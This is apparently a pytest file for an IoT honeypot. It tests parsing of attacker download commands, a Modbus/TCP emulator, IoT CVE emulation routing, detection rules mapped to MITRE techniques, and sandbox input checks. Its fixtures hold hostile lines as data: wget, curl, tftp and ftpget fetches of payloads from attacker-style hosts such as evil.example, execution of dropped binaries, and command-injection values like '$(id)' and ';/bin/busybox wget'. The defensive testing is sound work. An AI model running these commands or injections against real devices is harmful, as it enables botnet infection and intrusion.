"""
HoneyBot-IoT v0.8 regression tests — device machines, real restricted shell,
Modbus/TCP, IoT CVE emulation and the new behavioural detection rules.

These are pure-unit tests: no PostgreSQL, Redis or Docker required.
"""
import os
import struct
import importlib

import pytest


# ── command intelligence (shared by the fake and real shell) ────────────────
from common import cmdintel


@pytest.mark.parametrize("line,expected", [
    ("wget http://1.2.3.4/bins/arm7", [("http://1.2.3.4/bins/arm7", "wget")]),
    ("cd /tmp; busybox wget 1.2.3.4/x -O a", [("http://1.2.3.4/x", "wget")]),
    ("curl -O http://evil.example/m.sh", [("http://evil.example/m.sh", "curl")]),
    ("tftp -g -r boot.bin 198.51.100.7", [("tftp://198.51.100.7/boot.bin", "tftp")]),
    ("ftpget -u a -p b 203.0.113.5 out in", [("ftp://203.0.113.5/in", "ftpget")]),
])
def test_download_targets(line, expected):
    assert cmdintel.download_targets(line) == expected


def test_download_targets_dedup_and_scheme():
    got = cmdintel.download_targets("wget http://h/x; wget http://h/x; echo http://h/y")
    urls = [u for u, _ in got]
    assert urls == ["http://h/x", "http://h/y"]


def test_exec_targets():
    assert cmdintel.exec_targets("chmod 777 /tmp/.a; ./.a; /tmp/x telnet") == ["./.a", "/tmp/x"]
    assert cmdintel.exec_targets("sh /tmp/run.sh") == ["/tmp/run.sh"]
    assert cmdintel.exec_targets("ls -la") == []


# ── real-shell mode selection ───────────────────────────────────────────────
def test_shell_mode_selection(monkeypatch):
    from common import realshell
    monkeypatch.setenv("SHELL_MODE", "fake")
    monkeypatch.delenv("SHELL_MODE_SENSOR", raising=False)
    assert realshell.enabled_for("sensor") is False
    monkeypatch.setenv("SHELL_MODE_SENSOR", "real")
    assert realshell.enabled_for("sensor") is True
    monkeypatch.setenv("SHELL_MODE", "real")
    monkeypatch.delenv("SHELL_MODE_SENSOR", raising=False)
    assert realshell.enabled_for("cctv") is True


def test_line_recorder_reconstructs_commands():
    from common import realshell
    logged = []

    class S:
        ip = "203.0.113.1"
        def command(self, c, output=None, **k): logged.append(c)
        def event(self, *a, **k): pass
    rec = realshell.LineRecorder(S())
    rec.feed(b"uname -a\r\n")
    rec.feed(b"ca")
    rec.feed(b"x\x7ft /etc/passwd\n")   # backspace removes the 'x'
    rec.close()
    assert logged == ["uname -a", "cat /etc/passwd"]


# ── Modbus/TCP honeypot ──────────────────────────────────────────────────────
class _FakeSession:
    id = "00000000-0000-0000-0000-000000000000"
    ip = "203.0.113.2"
    protocol = "Modbus"
    device = "sensor"
    def __init__(self): self.events = []
    def event(self, t, **k): self.events.append((t, k))
    def command(self, *a, **k): pass


@pytest.fixture()
def modbus():
    os.environ.setdefault("DB_CONNECT_RETRIES", "1")
    m = importlib.import_module("modbus_honeypot.modbus_honeypot")
    return m


def test_modbus_read_holding_registers(modbus):
    conn = modbus.ModbusConn(None, _FakeSession())
    resp = conn._dispatch(struct.pack(">BHH", 3, 0, 7))
    assert resp[0] == 3 and resp[1] == 14          # fc=3, byte count = 7 regs * 2
    regs = struct.unpack(">" + "H" * 7, resp[2:])
    assert len(regs) == 7


def test_modbus_write_threshold_updates_state(modbus):
    from common.state import STATE
    s = _FakeSession()
    conn = modbus.ModbusConn(None, s)
    resp = conn._dispatch(struct.pack(">BHH", 6, 3, 50))   # reg idx3 = temp_threshold, 50/10=5.0
    assert resp == struct.pack(">BHH", 6, 3, 50)
    assert STATE.field("sensor", "temp_threshold") == "5.0"
    assert any(t == "modbus_write" for t, _ in s.events)
    assert any(t == "state_change" for t, _ in s.events)


def test_modbus_readonly_register_rejected(modbus):
    conn = modbus.ModbusConn(None, _FakeSession())
    resp = conn._dispatch(struct.pack(">BHH", 6, 0, 999))  # reg idx0 = temperature (read-only)
    assert resp[0] == 0x86 and resp[1] == modbus.EXC_ILLEGAL_ADDRESS


def test_modbus_illegal_function(modbus):
    conn = modbus.ModbusConn(None, _FakeSession())
    resp = conn._dispatch(struct.pack(">BHH", 99, 0, 1))
    assert resp[0] == (99 | 0x80) and resp[1] == modbus.EXC_ILLEGAL_FUNCTION


# ── IoT CVE emulation ────────────────────────────────────────────────────────
def test_exploit_command_extraction():
    from http_honeypot import exploits
    assert exploits._extract_command("<language>$(id)</language>") == "id"
    assert exploits._extract_command("x?cmd=cat%20/etc/passwd") == "cat /etc/passwd"
    assert exploits._extract_command("dest_host=;/bin/busybox wget http://h/x;") == \
        "/bin/busybox wget http://h/x"
    assert exploits._extract_command("nothing here") is None


@pytest.mark.parametrize("path,method,ok", [
    ("/SDK/webLanguage", "PUT", True),
    ("/ctrlt/DeviceUpgrade_1", "POST", True),
    ("/GponForm/diag_Form", "GET", True),
    ("/cgi-bin/supervisor/ping", "GET", True),
    ("/index.html", "GET", False),
])
def test_exploit_routing(path, method, ok):
    from http_honeypot import exploits
    assert (exploits.match(path, method) is not None) == ok


# ── behavioural detection rules + MITRE coverage ────────────────────────────
def test_behavioural_patterns_match_postexploit():
    from intel import rules
    from tests.simulate_attacks import POSTEXPLOIT_CMDS
    joined = " ; ".join(POSTEXPLOIT_CMDS)
    hit = {atype for rx, atype, _sev, _ in rules.BEHAVIOURS if rx.search(joined)}
    for expected in ("PERSISTENCE", "DEFENSE_EVASION", "CONTAINER_ESCAPE",
                     "CRYPTO_MINING", "REVERSE_SHELL"):
        assert expected in hit, expected


def test_every_attack_type_has_mitre():
    from intel import rules, mitre
    types = {atype for _, atype, _, _ in rules.BEHAVIOURS}
    types |= {"MQTT_FLOOD", "ICS_PARAMETER_TAMPERING", "ICS_DEVICE_SCAN"}
    for t in types:
        ids, names = mitre.techniques_for(t)
        assert ids and all(i in mitre.NAMES for i in ids), t


def test_fakeshell_has_cctv_profile():
    from common.fakeshell import FakeShell
    sh = FakeShell("cctv", session=None, user="root")
    assert sh.p["hostname"] == "IPC-HFW2431S"
    out, _ = sh.run("uname -a")
    assert "armv7l" in out


# ── sandbox request validation (no Docker needed) ───────────────────────────
def test_sandbox_sid_and_image_format():
    sandbox = importlib.import_module("sandbox.sandbox")
    assert sandbox.SID_RE.match("11111111-2222-3333-4444-555555555555")
    assert not sandbox.SID_RE.match("../etc/passwd")
    assert sandbox.IMAGE.format(device="cctv").startswith("honeybot/vm-cctv")
    assert "sensor" in sandbox.DEVICES
